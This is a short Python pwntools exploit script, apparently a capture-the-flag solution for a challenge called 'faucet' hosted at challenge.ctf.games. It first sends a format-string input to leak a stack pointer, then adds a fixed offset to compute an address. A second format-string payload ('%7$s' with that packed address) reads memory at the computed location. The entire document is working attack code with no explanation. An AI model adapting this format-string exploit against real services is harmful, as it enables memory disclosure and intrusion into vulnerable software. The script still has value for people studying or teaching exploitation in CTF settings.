from pwn import *

#io = process('./faucet')
io = remote('challenge.ctf.games', 32232)

print(io.recvuntil(b'> '))
io.sendline('5')
print(io.recvuntil(b'to buy?: '))
io.sendline('%10$p')
print(io.recvuntil(b'You have bought a '))
hac = p64(int(io.recvline(), 16) + 11904)
print(io.recvuntil(b'> '))
io.sendline('5')
print(io.recvuntil(b'to buy?: '))
payload = b'AAAA%7$s' + hac
io.sendline(payload)
print(io.recv())
print(io.recv())
